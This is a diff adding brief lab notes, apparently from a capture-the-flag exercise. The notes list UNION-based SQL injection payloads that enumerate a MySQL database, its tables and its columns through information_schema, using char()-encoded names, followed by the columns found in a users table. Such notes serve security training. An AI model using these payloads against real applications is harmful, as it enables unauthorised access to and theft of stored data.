@@ -1,0 +1,16 @@
+get database DATABASE_NAME
+    UNION SELECT 1, database()
+get TABEL_NAME
+    UNION SELECT 1, TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA = char(77,101,109,98,101,114,95,83,113,108,95,73,110,106,101,99,116,105,111,110)
+get COLUMN_NAME
+    UNION SELECT 1, COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = char(77,101,109,98,101,114,95,83,113,108,95,73,110,106,101,99,116,105,111,110) AND TABLE_NAME = char(117,115,101,114,115)
+
+TABLE COLUMNS 
+    * user_id
+    * first_name
+    * last_name
+    * town
+    * country 
+    * planet
+    * Commentaire
+    * countersign
